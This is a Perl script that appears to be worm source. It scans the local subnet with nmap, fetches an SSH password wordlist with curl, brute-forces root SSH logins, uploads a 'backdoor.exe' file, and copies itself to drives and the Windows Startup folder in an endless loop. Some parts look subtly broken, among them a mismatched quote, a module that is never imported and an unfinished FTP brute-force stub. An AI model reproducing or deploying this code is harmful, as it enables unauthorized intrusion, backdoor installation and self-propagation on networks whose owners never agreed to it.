#!/usr/bin/perl

use strict;
use warnings;
use Net::Ping;
use Net::Nmap::Scan;
use Net::FTP;
use File::Copy;
use File::Basename;
use File::Spec;
use threads;

use networking;

# ------------------- Logging -----------------------

use Term::ANSIColor qw(:constants);
use Log::Log4perl qw(:easy);
Log::Log4perl->easy_init($ERROR);
my $logger = Log::Log4perl->get_logger();

# ---------------------------------------------------

my $gateway = `/sbin/ip route | awk '/default/ { print \$3 }'`;

sub scan_hosts {
    my ($port) = @_;
    $logger->info("Scanning machines on the same network with port $port open.");
    $logger->info("Gateway: $gateway");
    my $scanner = Net::Nmap::Scan->new();
    my $result = $scanner->scan(
        targets => $gateway . '/24',
        ports => $port,
        os_fingerprint => 1,
    );
    my $hosts = $result->get_host_list();
    $logger->info("Hosts: @$hosts");
    return @$hosts;
}

sub download_ssh_passwords {
    my ($filename) = @_;
    $logger->info("Downloading passwords...");
    my $url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt";
    system("curl -s $url -o $filename");
    $logger->info("Passwords downloaded!");
}

sub connect_to_ftp {
    # TODO:30 : Finish this function + Add bruteforcing
    my ($host, $username, $password) = @_;
    eval {
        my $ftp = Net::FTP->new($host);
        $ftp->login($username, $password);
    };
    if ($@) {
        $logger->error($@);
    }
}

sub connect_to_ssh {
    my ($host, $password) = @_;
    my $ssh = Net::SSH::Perl->new($host);
    eval {
        $ssh->login("root", $password);
        $logger->info("Successfully connected!");
        $ssh->scp_put('backdoor.exe', '/destination'); # change this
    };
    if ($@) {
        $logger->error($@);
    }
}

sub bruteforce_ssh {
    my ($host, $wordlist) = @_;
    # TODO:10 : Bruteforce usernames too
    open my $fh, '<', $wordlist or die "Could not open '$wordlist' $!";
    while (my $line = <$fh>) {
        chomp $line;
        my $connection = connect_to_ssh($host, $line);
        print $connection, "\n";
        sleep(5);
    }
}

sub drivespreading {
    while (1) {
        my @drives = File::Spec->splitdir($ENV{SystemDrive} . '\');
        for my $drive (@drives) {
            next if $drive !~ /[A-Z]/i;
            my $path = "$drive/";
            eval {
                File::Copy::copy($0, $path . basename($0));
                my $startup_folder = File::Spec->catdir($ENV{APPDATA}, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup');
                File::Copy::copy($0, $startup_folder) if $drive eq 'C:';
            };
            if ($@) {
                $logger->error($@);
            }
        }
        sleep(30); # Sleep for 30 seconds before looping again
    }
}
